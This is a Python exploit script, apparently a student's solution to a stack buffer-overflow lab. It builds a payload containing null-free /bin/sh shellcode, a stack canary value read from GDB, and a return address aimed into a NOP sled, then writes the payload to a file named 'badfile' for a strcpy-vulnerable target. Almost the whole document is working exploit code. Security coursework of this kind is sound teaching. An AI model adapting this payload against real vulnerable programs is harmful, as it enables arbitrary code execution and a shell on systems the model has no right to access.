#!/usr/bin/python3
import sys

def p32(x):
    """Pack a 32-bit integer in little-endian format."""
    return x.to_bytes(4, byteorder='little')

# ============================================================
# Shellcode for opening shell
# ============================================================
shellcode = (
    "\x31\xc0"          # xor    eax, eax
    "\x50"              # push   eax
    "\x68""//sh"        # push   0x68732f2f
    "\x68""/bin"        # push   0x6e69622f
    "\x89\xe3"          # mov    ebx, esp
    "\x50"              # push   eax
    "\x53"              # push   ebx
    "\x89\xe1"          # mov    ecx, esp
    "\x99"              # cdq
    "\xb0\x0b"          # mov    al, 0x0b
    "\xcd\x80"          # int    0x80
).encode('latin-1')

# ============================================================
# TODO: Fill in the values below based on your GDB analysis
# ============================================================

# Your Student ID (last 3 digits, no leading zeroes)
STUDENT_ID = 4               # TODO: Replace with your ID

READ_SZ = 80 + 200 + STUDENT_ID

# ============================================================
# Canary value — computed at runtime by init_canary().
# You CANNOT compute this from the source code alone.
# You MUST read it from GDB:
#   (gdb) b vuln
#   (gdb) run
#   (gdb) p canary_seed
# ============================================================
canary_val = 0x754f7ddd       # TODO: Replace with value from GDB

# Buffer address (from GDB: p &buffer)
buffer_addr = 0xffffd348      # TODO: Replace

# Offset from buffer to canary (from GDB: p &canary - p &buffer)
canary_offset = 84             # TODO: Replace

# Offset from buffer to return address (from GDB: $ebp - &buffer + 4)
ret_offset = 100                # TODO: Replace

# ============================================================
# Shellcode — you must find or write a null-byte-free shellcode
# that spawns /bin/sh. strcpy() stops at \x00, so your entire
# payload (including shellcode) must be null-byte-free.
# ============================================================

# ============================================================
# Construct the payload
# ============================================================
# We have a total of READ_SZ (284) bytes. 
# Layout:
# [ NOPs ] [ CANARY ] [ NOPs ] [ ret_addr ] [ MASSIVE NOP SLED ] [ shellcode ] [\x00]

payload = bytearray(0x90 for i in range(READ_SZ))

# 1. Place the canary
payload[canary_offset:canary_offset+4] = p32(canary_val)

# 2. Place the shellcode at the very end (just before the null terminator)
sc_start = READ_SZ - len(shellcode) - 1
payload[sc_start:sc_start+len(shellcode)] = shellcode

# 3. Place the return address. 
# Point it deep into the massive NOP sled *after* the return address
# buffer_addr + 150 is extremely safe and gives you ~100 bytes of leeway!
ret_addr = buffer_addr + 150
payload[ret_offset:ret_offset+4] = p32(ret_addr)

# 4. Null terminator to stop strcpy()
payload[-1] = 0x00

# ============================================================
# Write the payload to badfile
# ============================================================
with open('badfile', 'wb') as f:
    f.write(payload)

print("badfile generated successfully!")

